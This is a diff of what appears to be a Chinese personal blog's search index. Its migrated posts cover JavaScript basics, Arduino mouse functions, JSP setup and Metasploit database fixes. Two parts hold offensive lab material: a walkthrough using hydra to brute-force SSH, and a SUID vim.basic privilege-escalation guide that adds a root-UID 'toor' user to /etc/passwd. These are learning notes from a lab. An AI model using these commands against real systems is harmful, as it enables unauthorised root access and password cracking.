-document.getElementById("t3").innerHTML=t1+t2+t3;   //python is best
-document.getElementById("t4").innerHTML=t1+a+" "+t3;   //python 1 best
-……………………
-
-（省略部分代码）
-
-&lt;h1 id = "t2"&gt;javascript_2&lt;/h1&gt;
-&lt;h1 id = "t3"&gt;javascript_3&lt;/h1&gt;
-&lt;h1 id = "t4"&gt;javascript_4&lt;/h1&gt;</pre>
-
-</li>
-
-<p> </p>
-<p>关键字：</p>
-<ul>
-<li>定义变量 ：var</li>
-<li>其他都大同小异，for ，for in ，switch，throw，break，continue，什么什么的</li>
-</ul>
-<p>空格：</p>
-<p>　　可以和python一样，随意加入空格，如a=b+c;与a = b + c ;的效果是一样的</p>
-<p>折行：</p>
-<ul>
-<li>可以在文本字符串中使用反斜杠对代码行进行换行。如：</li>
-</ul>
-<p>　　不过，不能像这样折行：</p>
-<p>未申明：</p>
-<li>当一个变量只定义不申明时，值为undefined，如
-
-<pre>var empty;
-document.getElementById("t5").innerHTML=empty;     //undefined</pre>
-
-<p> </p>
-</li>
-<li>当一个变量多次申明时，取最新的，如
-
-<pre>var muti="123";
-var muti="456"
-document.getElementById("t6").innerHTML=muti;   //456</pre>
-
-<p>但是如果未声明，则不影响</p>
-<pre>var muti="123";
-var muti;
-document.getElementById("t6").innerHTML=muti;   //123</pre>
-
-</li>
-
-<p> 关于this：</p>
-<li>js中也有类似于java中的this，食用方法如下
-
-<pre>&lt;button  onclick="this.innerHTML=Date()"&gt;获取当前时间&lt;/button&gt;</pre>
-
-<p> </p>
-</li>
-
-<p>if语句：</p>
-<li>使用**variablename**=(**condition**)?**value1**:**value2** 来缩短代码量，使用如下
-
-<pre>voteable=(age&lt;18)?"年龄太小":"年龄已达到";</pre>
-
-</li>
-<li>可以只有if，不接else。如
-
-<pre>if (time&lt;20)
-{
-    x="Good day";
-}</pre>
-
-</li>
-- js也有else if
 ]]></content>
       <categories>
         <category>cnblogs</category>
@@ -1522,6 +1417,111 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 <p> </p>
 <p>原因是没有选择一个数据库，可以先show databases；查看有哪些数据库，再use ’数据库名‘ 来使用一个数据库。</p>
 <p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>JS学习中的细节</title>
+    <url>/2020/01/19/JS%E5%AD%A6%E4%B9%A0%E4%B8%AD%E7%9A%84%E7%BB%86%E8%8A%82/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12215067.html">源地址：https://www.cnblogs.com/This-is-Y/p/12215067.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>————恢复内容开始————</p>
+<p>输出</p>
+<ul>
+<li>document.getElementById(“id_name”).innerHTML=”输出内容”;</li>
+</ul>
+<p>　　这种是通过找到该id得元素进行修改，达到输出的目的。</p>
+<ul>
+<li>document.write(“html代码”);</li>
+</ul>
+<p>　　从内容就可以知道这是直接写一段html代码到当前html文档中</p>
+<ul>
+<li>console.log(“内容”);</li>
+</ul>
+<p>　　这是输出到浏览器控制台，前端不可见。按F12到console查看，代码出错的时候，还会有报错信息。</p>
+<p>大小写</p>
+<ul>
+<li>js对大小写严格，getELementById和GETelementbyid是不一样的（写成后面这样子前端不会报错，但是代码不会工作，控制台里会给错误信息）。同样，变量名也如此</li>
+</ul>
+<p>字符串拼接</p>
+<li>字符串用单引号或者双引号包起来，可以使用加号拼接，当字符串与数字用加号拼接时，数字作为字符串处理
+
+<pre>var a = 1;
+var b = 3;
+var t1 = "python ";
+var t2 = "is ";
+var t3 = "best ";
+document.getElementById("t2").innerHTML=a+b;    //4
+document.getElementById("t3").innerHTML=t1+t2+t3;   //python is best
+document.getElementById("t4").innerHTML=t1+a+" "+t3;   //python 1 best
+……………………
+
+（省略部分代码）
+
+&lt;h1 id = "t2"&gt;javascript_2&lt;/h1&gt;
+&lt;h1 id = "t3"&gt;javascript_3&lt;/h1&gt;
+&lt;h1 id = "t4"&gt;javascript_4&lt;/h1&gt;</pre>
+
+</li>
+
+<p> </p>
+<p>关键字：</p>
+<ul>
+<li>定义变量 ：var</li>
+<li>其他都大同小异，for ，for in ，switch，throw，break，continue，什么什么的</li>
+</ul>
+<p>空格：</p>
+<p>　　可以和python一样，随意加入空格，如a=b+c;与a = b + c ;的效果是一样的</p>
+<p>折行：</p>
+<ul>
+<li>可以在文本字符串中使用反斜杠对代码行进行换行。如：</li>
+</ul>
+<p>　　不过，不能像这样折行：</p>
+<p>未申明：</p>
+<li>当一个变量只定义不申明时，值为undefined，如
+
+<pre>var empty;
+document.getElementById("t5").innerHTML=empty;     //undefined</pre>
+
+<p> </p>
+</li>
+<li>当一个变量多次申明时，取最新的，如
+
+<pre>var muti="123";
+var muti="456"
+document.getElementById("t6").innerHTML=muti;   //456</pre>
+
+<p>但是如果未声明，则不影响</p>
+<pre>var muti="123";
+var muti;
+document.getElementById("t6").innerHTML=muti;   //123</pre>
+
+</li>
+
+<p> 关于this：</p>
+<li>js中也有类似于java中的this，食用方法如下
+
+<pre>&lt;button  onclick="this.innerHTML=Date()"&gt;获取当前时间&lt;/button&gt;</pre>
+
+<p> </p>
+</li>
+
+<p>if语句：</p>
+<li>使用**variablename**=(**condition**)?**value1**:**value2** 来缩短代码量，使用如下
+
+<pre>voteable=(age&lt;18)?"年龄太小":"年龄已达到";</pre>
+
+</li>
+<li>可以只有if，不接else。如
+
+<pre>if (time&lt;20)
+{
+    x="Good day";
+}</pre>
+
+</li>
+- js也有else if
 ]]></content>
       <categories>
         <category>cnblogs</category>
@@ -1992,7 +1992,7 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 <p> </p>
 <p> </p>
 <p>也可以用kalissh远程登陆（推荐用这个，vmbox太tm蛋疼了）</p>
-<p>ssh <a class="link" href="mailto:&#x66;&#108;&#x61;&#x67;&#52;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#49;&#50;&#52;&#46;&#x37;&#x36;">&#x66;&#108;&#x61;&#x67;&#52;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#49;&#50;&#52;&#46;&#x37;&#x36;<i class="fas fa-external-link-alt"></i></a></p>
+<p>ssh <a class="link" href="mailto:&#102;&#x6c;&#x61;&#103;&#52;&#64;&#49;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#x31;&#50;&#x34;&#46;&#55;&#x36;">&#102;&#x6c;&#x61;&#103;&#52;&#64;&#49;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#x31;&#50;&#x34;&#46;&#55;&#x36;<i class="fas fa-external-link-alt"></i></a></p>
 <img src="1503868-20191008194735795-928890603.png" alt>
 
 <p> </p>
@@ -2048,7 +2048,7 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 <p>做完这个感觉自己真的很菜，在此总结一下这个过程中了解到的，学到的，以及还不懂的知识</p>
 <p>1.arp-scan -l 　　用来扫描局域网内的主机。（参考<a class="link" href="https://blog.csdn.net/weixin_43221560/article/details/90550294">https://blog.csdn.net/weixin_43221560/article/details/90550294<i class="fas fa-external-link-alt"></i></a>）</p>
 <p>2.用 msf5来reach drupal寻找漏洞，配置并使用这些漏洞（一知半解，还得好好学习），</p>
-<p>3.ssh远程连接，如在渗透过程中使用到的  ssh <a class="link" href="mailto:&#x66;&#108;&#97;&#103;&#52;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#49;&#x32;&#x34;&#x2e;&#x37;&#54;">&#x66;&#108;&#97;&#103;&#52;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#49;&#x32;&#x34;&#x2e;&#x37;&#54;<i class="fas fa-external-link-alt"></i></a>。挺方便的</p>
+<p>3.ssh远程连接，如在渗透过程中使用到的  ssh <a class="link" href="mailto:&#102;&#x6c;&#97;&#103;&#52;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#49;&#x32;&#x34;&#46;&#55;&#x36;">&#102;&#x6c;&#97;&#103;&#52;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#49;&#x32;&#x34;&#46;&#55;&#x36;<i class="fas fa-external-link-alt"></i></a>。挺方便的</p>
 <p>4.john the Ripper +hydra 爆破，（john下载安装参考<a class="link" href="https://blog.csdn.net/Romanticduan/article/details/81233479">https://blog.csdn.net/Romanticduan/article/details/81233479<i class="fas fa-external-link-alt"></i></a>，使用参考<a class="link" href="https://blog.csdn.net/qq_36119192/article/details/83373895">https://blog.csdn.net/qq_36119192/article/details/83373895<i class="fas fa-external-link-alt"></i></a>）</p>
 <p>hydra -l flag4 -P /root/john-1.8.0/run/password.lst ssh://192.168.124.76（也是一知半解，同样得学）</p>
 <p>5.suid提权</p>
@@ -2244,6 +2244,40 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       <categories>
         <category>cnblogs</category>
       </categories>
+  </entry>
+  <entry>
+    <title>arduino的mouse使用</title>
+    <url>/2021/03/28/arduino%E7%9A%84mouse%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>&lt;主要来源于：<a class="link" href="https://www.arduino.cc/en/Reference.MouseKeyboard&gt;">https://www.arduino.cc/en/Reference.MouseKeyboard&gt;<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="各种函数"><a href="#各种函数" class="headerlink" title="各种函数"></a>各种函数</h1><h2 id="begin"><a href="#begin" class="headerlink" title="begin()"></a>begin()</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>开始模拟连接到计算机的鼠标。 必须在控制计算机之前调用begin()。 要结束控制，请使用Mouse.end()。</p>
+<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.begin()</code></p>
+<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>无</p>
+<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
+<h2 id="click"><a href="#click" class="headerlink" title="click()"></a>click()</h2><h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><p>向光标所在位置的计算机发送短暂的点击。这与按下(press)并立即释放(release)鼠标按钮是相同的。<br>click()默认为鼠标左键。</p>
+<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p>Mouse.click()<br>Mouse.click(button)</p>
+<h3 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h3><p>button:按下的鼠标按钮允许的数据类型： char.<br><code>MOUSE_LEFT (默认)</code><br><code>MOUSE_RIGHT</code><br><code>MOUSE_MIDDLE</code> </p>
+<h3 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
+<h2 id="end"><a href="#end" class="headerlink" title="end()"></a>end()</h2><h3 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h3><p>停止模拟连接到计算机的鼠标。 要开始控制，请使用Mouse.begin（）。</p>
+<h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.end()</code></p>
+<h3 id="参数-2"><a href="#参数-2" class="headerlink" title="参数"></a>参数</h3><p>无</p>
+<h3 id="返回值-2"><a href="#返回值-2" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
+<h2 id="move"><a href="#move" class="headerlink" title="move()"></a>move()</h2><h3 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h3><p>在连接的计算机上移动光标。 屏幕上的运动总是相对于光标的当前位置。 使用Mouse.move（）之前，必须先调用Mouse.begin（） </p>
+<h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.move(xVal, yVal, wheel)</code></p>
+<h3 id="参数-3"><a href="#参数-3" class="headerlink" title="参数"></a>参数</h3><p>xVal: 沿x轴移动的量。 允许的数据类型: signed char.<br>yVal: 沿y轴移动的量。 允许的数据类型: signed char.<br>wheel: 移动滚轮的数量。 允许的数据类型: signed char.</p>
+<h3 id="返回值-3"><a href="#返回值-3" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
+<h2 id="press"><a href="#press" class="headerlink" title="press()"></a>press()</h2><h3 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h3><p>将按钮按下发送到连接的计算机。 按下相当于单击并连续按住鼠标按钮。 通过Mouse.release（）取消了按下。<br>在使用Mouse.press（）之前，您需要开始与Mouse.begin（）进行通信。<br>Mouse.press（）默认为鼠标左键按下。</p>
+<h3 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.press()</code><br><code>Mouse.press(button)</code></p>
+<h3 id="参数-4"><a href="#参数-4" class="headerlink" title="参数"></a>参数</h3><p>button: 按下的鼠标按钮允许的数据类型: char.<br><code>MOUSE_LEFT (默认)</code><br><code>MOUSE_RIGHT</code><br><code>MOUSE_MIDDLE</code></p>
+<h3 id="返回值-4"><a href="#返回值-4" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
+<h2 id="release"><a href="#release" class="headerlink" title="release()"></a>release()</h2><h3 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h3><p>发送一条消息，指出先前按下的按钮（通过Mouse.press（）调用）已释放。 Mouse.release（）默认为左侧按钮。</p>
+<h3 id="语法-5"><a href="#语法-5" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.release()</code><br><code>Mouse.release(button)</code></p>
+<h3 id="参数-5"><a href="#参数-5" class="headerlink" title="参数"></a>参数</h3><p>button: 按下的鼠标按钮允许的数据类型: char.<br><code>MOUSE_LEFT (默认)</code><br><code>MOUSE_RIGHT</code><br><code>MOUSE_MIDDLE</code></p>
+<h3 id="返回值-5"><a href="#返回值-5" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
+<h2 id="isPressed"><a href="#isPressed" class="headerlink" title="isPressed()"></a>isPressed()</h2><h3 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h3><p>检查所有鼠标按钮的当前状态，并报告是否按下任何鼠标按钮。</p>
+<h3 id="语法-6"><a href="#语法-6" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.isPressed();</code><br><code>Mouse.isPressed(button);</code></p>
+<h3 id="参数-6"><a href="#参数-6" class="headerlink" title="参数"></a>参数</h3><p>button: 按下的鼠标按钮允许的数据类型: char.<br><code>MOUSE_LEFT (默认)</code><br><code>MOUSE_RIGHT</code><br><code>MOUSE_MIDDLE</code></p>
+<h3 id="返回值-6"><a href="#返回值-6" class="headerlink" title="返回值"></a>返回值</h3><p>报告按钮是否被按下。数据类型:bool。</p>
+]]></content>
   </entry>
   <entry>
     <title>docker学习笔记</title>
@@ -2541,6 +2575,105 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 <p>由于HTTP是一种无状态的协议，服务器单从网络连接上无从知道客户身份。怎么办呢？就给客户端们颁发一个通行证吧，每人一个，无论谁访问都必须携带自己通行证。这样服务器就能从通行证上确认客户身份了。这就是Cookie的工作原理。（如果盗取了别人的cookie，就可以用别人的身份登陆一些网站，当然，有些网站还会有别的认证方式，但这种安全隐患还是值得注意）</p>
 <p> </p>
 <p>（图片来源：乾颐堂）</p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>jsp与eclipse对接</title>
+    <url>/2020/09/07/jsp%E4%B8%8Eeclipse%E5%AF%B9%E6%8E%A5/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13629909.html">源地址：https://www.cnblogs.com/This-is-Y/p/13629909.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>先安装好tomcat，双击运行startup.bat启动后，浏览器输入127.0.0.1:8080出现了这只超丑的猫后即配置正常</p>
+<img src="1503868-20200907230207551-369076692.png" width="1000" loading="lazy">
+
+<p> </p>
+<p> </p>
+<p>然后关掉服务</p>
+<p> </p>
+<p>打开eclipse，窗口-&gt;首选项</p>
+<img src="1503868-20200907230306446-1642999374.png" alt loading="lazy">
+
+<p> </p>
+<p> </p>
+<p> 搜索runtime，找到runtime environment，点添加</p>
+<img src="1503868-20200907230354718-718380580.png" alt loading="lazy">
+
+<p> </p>
+<p> </p>
+<p> 找到自己安装好的版本，下一步</p>
+<img src="1503868-20200907230530225-590582225.png" alt loading="lazy">
+
+<p> </p>
+<p> </p>
+<p> 确定路径，选择jre，完成</p>
+<img src="1503868-20200907230551064-44944959.png" alt loading="lazy">
+
+<p> </p>
+<p> </p>
+<p> 最后保存退出</p>
+<p> </p>
+<p>新建文件-&gt;Dynamic web Project</p>
+<img src="1503868-20200907230716063-329426504.png" alt loading="lazy">
+
+<p> </p>
+<p> </p>
+<p>起名：testtttt</p>
+<img src="1503868-20200907230923525-1784495570.png" alt loading="lazy">
+
+<p> </p>
+<p> </p>
+<p> 然后选择版本，路径，JRE</p>
+<img src="1503868-20200907231239549-1656407563.png" alt loading="lazy">
+
+<p> </p>
+<p> </p>
+<p> 之后下一步，到这里点上Generate web.xml deployment descriptor</p>
+<img src="1503868-20200907231346535-1892396403.png" alt loading="lazy">
+
+<p> </p>
+<p> </p>
+<p> 之后在左边可以看到testtttt，jsp文件写在WebContent下面</p>
+<img src="1503868-20200907231507947-1461537134.png" alt loading="lazy">
+
+<p> </p>
+<p> </p>
+<p> 各个目录解释；</p>
+<ul>
+<li>deployment descriptor：部署的描述。</li>
+<li>build：放入编译之后的文件。</li>
+<li>WebContent:放进写入的页面。</li>
+</ul>
+<p> </p>
+<p>创建一个testttt.jsp文件在WebContent下</p>
+<img src="1503868-20200907231922353-1329783924.png" alt loading="lazy">
+
+<p> </p>
+<p> 写入代码</p>
+<p>保存，</p>
+<p>在窗口-&gt;Web Brower中选择浏览器</p>
+<img src="1503868-20200907232023334-133616223.png" alt loading="lazy">
+
+<p> </p>
+<p> </p>
+<p>运行-&gt;运行方式  -&gt;Run on Server</p>
+<img src="1503868-20200907232119753-928200054.png" alt loading="lazy">
+
+<p> </p>
+<p> 跳出来的不需要配置，下一步就好了</p>
+<p>运行成功结果如下</p>
+<img src="1503868-20200907232331495-1124772426.png" width="1000" loading="lazy">
+
+<p> </p>
+<p> 要在浏览器访问这个页面</p>
+<p><a class="link" href="http://127.0.0.1:8080/testtttt/testttt.jsp">http://127.0.0.1:8080/testtttt/testttt.jsp<i class="fas fa-external-link-alt"></i></a></p>
+<p> </p>
+<p>参考自菜鸟教程：<a class="link" href="https://www.runoob.com/jsp/eclipse-jsp.html">https://www.runoob.com/jsp/eclipse-jsp.html<i class="fas fa-external-link-alt"></i></a></p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
 ]]></content>
       <categories>
         <category>cnblogs</category>
@@ -2855,122 +2988,60 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
-    <title>jsp与eclipse对接</title>
-    <url>/2020/09/07/jsp%E4%B8%8Eeclipse%E5%AF%B9%E6%8E%A5/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13629909.html">源地址：https://www.cnblogs.com/This-is-Y/p/13629909.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>先安装好tomcat，双击运行startup.bat启动后，浏览器输入127.0.0.1:8080出现了这只超丑的猫后即配置正常</p>
-<img src="1503868-20200907230207551-369076692.png" width="1000" loading="lazy">
-
-<p> </p>
-<p> </p>
-<p>然后关掉服务</p>
-<p> </p>
-<p>打开eclipse，窗口-&gt;首选项</p>
-<img src="1503868-20200907230306446-1642999374.png" alt loading="lazy">
-
-<p> </p>
-<p> </p>
-<p> 搜索runtime，找到runtime environment，点添加</p>
-<img src="1503868-20200907230354718-718380580.png" alt loading="lazy">
-
-<p> </p>
-<p> </p>
-<p> 找到自己安装好的版本，下一步</p>
-<img src="1503868-20200907230530225-590582225.png" alt loading="lazy">
-
-<p> </p>
-<p> </p>
-<p> 确定路径，选择jre，完成</p>
-<img src="1503868-20200907230551064-44944959.png" alt loading="lazy">
-
-<p> </p>
-<p> </p>
-<p> 最后保存退出</p>
-<p> </p>
-<p>新建文件-&gt;Dynamic web Project</p>
-<img src="1503868-20200907230716063-329426504.png" alt loading="lazy">
-
-<p> </p>
-<p> </p>
-<p>起名：testtttt</p>
-<img src="1503868-20200907230923525-1784495570.png" alt loading="lazy">
-
-<p> </p>
-<p> </p>
-<p> 然后选择版本，路径，JRE</p>
-<img src="1503868-20200907231239549-1656407563.png" alt loading="lazy">
-
-<p> </p>
-<p> </p>
-<p> 之后下一步，到这里点上Generate web.xml deployment descriptor</p>
-<img src="1503868-20200907231346535-1892396403.png" alt loading="lazy">
-
-<p> </p>
-<p> </p>
-<p> 之后在左边可以看到testtttt，jsp文件写在WebContent下面</p>
-<img src="1503868-20200907231507947-1461537134.png" alt loading="lazy">
-
-<p> </p>
-<p> </p>
-<p> 各个目录解释；</p>
+    <title>linux 通过suid vim.basic文件提权</title>
+    <url>/2020/06/30/linux%20%E9%80%9A%E8%BF%87suid%20vim.basic%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13211224.html">源地址：https://www.cnblogs.com/This-is-Y/p/13211224.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>在kali上复现</p>
+<p>先给需要的vim.basic文件设置suid权限</p>
+<p>chmod u+s /usr/bin/vim.basic</p>
+<p>先adduser test1一个普通权限用户</p>
+<p>现在就是一个合适的提权环境</p>
+<p>通过以下命令可以找到存在suid权限的文件</p>
+<p>find / -user root -perm -4000 -print 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000 -exec ls -ldb {} \；</p>
+<p>可用于提权的文件有</p>
 <ul>
-<li>deployment descriptor：部署的描述。</li>
-<li>build：放入编译之后的文件。</li>
-<li>WebContent:放进写入的页面。</li>
+<li>nmap</li>
+<li>vim</li>
+<li>find</li>
+<li>bash</li>
+<li>more</li>
+<li>less</li>
+<li>nano</li>
+<li>cp</li>
 </ul>
-<p> </p>
-<p>创建一个testttt.jsp文件在WebContent下</p>
-<img src="1503868-20200907231922353-1329783924.png" alt loading="lazy">
+<img src="1503868-20200629233141311-1416832293.png" alt loading="lazy">
 
 <p> </p>
-<p> 写入代码</p>
-<p>保存，</p>
-<p>在窗口-&gt;Web Brower中选择浏览器</p>
-<img src="1503868-20200907232023334-133616223.png" alt loading="lazy">
+<p> 利用vim提权的思路是修改etc/passwd文件，为自己添加一个有root权限的用户</p>
+<p>passwd文件用户格式为：用户名:密码:uid:gid:注释:home目录:用户的shell</p>
+<p>这边可以看看root用户的格式</p>
+<p>root:x:0:0:root:/root:/bin/bash</p>
+<p>（密码这部分之所以是x，是因为真正的密码存在/etc/shadow文件里）</p>
+<img src="1503868-20200629233603504-1537448535.png" alt loading="lazy">
 
 <p> </p>
-<p> </p>
-<p>运行-&gt;运行方式  -&gt;Run on Server</p>
-<img src="1503868-20200907232119753-928200054.png" alt loading="lazy">
+<p>生成密码：用openssl passwd -1 –salt asd 123  （这里是-1（数字1）不是L）</p>
+<p>直接写在passwd文件里面，</p>
+<img src="1503868-20200629235203897-1099154171.png" alt loading="lazy">
 
 <p> </p>
-<p> 跳出来的不需要配置，下一步就好了</p>
-<p>运行成功结果如下</p>
-<img src="1503868-20200907232331495-1124772426.png" width="1000" loading="lazy">
+<p> toor:$1$asd$sTMDZlRI6L.jJEw2I.3x8.:0:0:root:/toor:/bin/bash</p>
+<p>用vim /etc/passwd可以修改，但是在保存是会出现E212，无法保存，提示我们没有权限修改这个</p>
+<img src="1503868-20200629235903572-1576856707.png" alt loading="lazy">
+
+<p>这时应该用之前find找到的vim.basic文件运行，这个程序是有suid权限的。绝对可以修改</p>
+<p>vim.basic /etc/passwd</p>
+<p>用这个打开，然后修改文件，就可以成功保存</p>
+<img src="1503868-20200629235613872-1996231369.png" alt loading="lazy">
 
 <p> </p>
-<p> 要在浏览器访问这个页面</p>
-<p><a class="link" href="http://127.0.0.1:8080/testtttt/testttt.jsp">http://127.0.0.1:8080/testtttt/testttt.jsp<i class="fas fa-external-link-alt"></i></a></p>
-<p> </p>
-<p>参考自菜鸟教程：<a class="link" href="https://www.runoob.com/jsp/eclipse-jsp.html">https://www.runoob.com/jsp/eclipse-jsp.html<i class="fas fa-external-link-alt"></i></a></p>
-<p> </p>
-<p> </p>
-<p> </p>
-<p> </p>
-<p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>msf启动显示 Nodatabase support：could not connect  to server connection refused</title>
-    <url>/2020/02/19/msf%E5%90%AF%E5%8A%A8%E6%98%BE%E7%A4%BA%20Nodatabase%20support%EF%BC%9Acould%20not%20connect%20%20to%20server%20connection%20refused/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12331180.html">源地址：https://www.cnblogs.com/This-is-Y/p/12331180.html<i class="fas fa-external-link-alt"></i></a></p>
-<img src="1503868-20200219140526686-766021379.png" alt width="716" height="155">
+<p>可以看到已经添加了，su toor切换，密码123，再id查看一下权限</p>
+ <img src="1503868-20200629235703917-1989192327.png" alt loading="lazy">
 
 <p> </p>
-<p> 如图，在启动msf时，一般都会自动连接上数据库，今天偶然出现这种情况。解决办法大致如下：</p>
-<p>exit退出当前msf</p>
-<p>可以先用msfdb start</p>
-<p>检查一下是否启动：netstat -pandu | grep 5432</p>
-<p>没有启动的话，用service postgresql start来连接</p>
-<img src="1503868-20200219143027800-1343091653.png" alt>
-
-<p> 在msf中可以输入db_(tab)来查看可用的数据库命令</p>
-<img src="1503868-20200219143355807-535893405.png" alt>
-
+<p> root权限</p>
 <p> </p>
+<p>chmod u+s /usr/bin/vim.basic</p>
 ]]></content>
       <categories>
         <category>cnblogs</category>
@@ -3054,60 +3125,23 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
-    <title>linux 通过suid vim.basic文件提权</title>
-    <url>/2020/06/30/linux%20%E9%80%9A%E8%BF%87suid%20vim.basic%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13211224.html">源地址：https://www.cnblogs.com/This-is-Y/p/13211224.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>在kali上复现</p>
-<p>先给需要的vim.basic文件设置suid权限</p>
-<p>chmod u+s /usr/bin/vim.basic</p>
-<p>先adduser test1一个普通权限用户</p>
-<p>现在就是一个合适的提权环境</p>
-<p>通过以下命令可以找到存在suid权限的文件</p>
-<p>find / -user root -perm -4000 -print 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000 -exec ls -ldb {} \；</p>
-<p>可用于提权的文件有</p>
-<ul>
-<li>nmap</li>
-<li>vim</li>
-<li>find</li>
-<li>bash</li>
-<li>more</li>
-<li>less</li>
-<li>nano</li>
-<li>cp</li>
-</ul>
-<img src="1503868-20200629233141311-1416832293.png" alt loading="lazy">
+    <title>msf启动显示 Nodatabase support：could not connect  to server connection refused</title>
+    <url>/2020/02/19/msf%E5%90%AF%E5%8A%A8%E6%98%BE%E7%A4%BA%20Nodatabase%20support%EF%BC%9Acould%20not%20connect%20%20to%20server%20connection%20refused/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12331180.html">源地址：https://www.cnblogs.com/This-is-Y/p/12331180.html<i class="fas fa-external-link-alt"></i></a></p>
+<img src="1503868-20200219140526686-766021379.png" alt width="716" height="155">
 
 <p> </p>
-<p> 利用vim提权的思路是修改etc/passwd文件，为自己添加一个有root权限的用户</p>
-<p>passwd文件用户格式为：用户名:密码:uid:gid:注释:home目录:用户的shell</p>
-<p>这边可以看看root用户的格式</p>
-<p>root:x:0:0:root:/root:/bin/bash</p>
-<p>（密码这部分之所以是x，是因为真正的密码存在/etc/shadow文件里）</p>
-<img src="1503868-20200629233603504-1537448535.png" alt loading="lazy">
+<p> 如图，在启动msf时，一般都会自动连接上数据库，今天偶然出现这种情况。解决办法大致如下：</p>
+<p>exit退出当前msf</p>
+<p>可以先用msfdb start</p>
+<p>检查一下是否启动：netstat -pandu | grep 5432</p>
+<p>没有启动的话，用service postgresql start来连接</p>
+<img src="1503868-20200219143027800-1343091653.png" alt>
+
+<p> 在msf中可以输入db_(tab)来查看可用的数据库命令</p>
+<img src="1503868-20200219143355807-535893405.png" alt>
 
 <p> </p>
-<p>生成密码：用openssl passwd -1 –salt asd 123  （这里是-1（数字1）不是L）</p>
-<p>直接写在passwd文件里面，</p>
-<img src="1503868-20200629235203897-1099154171.png" alt loading="lazy">
-
-<p> </p>
-<p> toor:$1$asd$sTMDZlRI6L.jJEw2I.3x8.:0:0:root:/toor:/bin/bash</p>
-<p>用vim /etc/passwd可以修改，但是在保存是会出现E212，无法保存，提示我们没有权限修改这个</p>
-<img src="1503868-20200629235903572-1576856707.png" alt loading="lazy">
-
-<p>这时应该用之前find找到的vim.basic文件运行，这个程序是有suid权限的。绝对可以修改</p>
-<p>vim.basic /etc/passwd</p>
-<p>用这个打开，然后修改文件，就可以成功保存</p>
-<img src="1503868-20200629235613872-1996231369.png" alt loading="lazy">
-
-<p> </p>
-<p>可以看到已经添加了，su toor切换，密码123，再id查看一下权限</p>
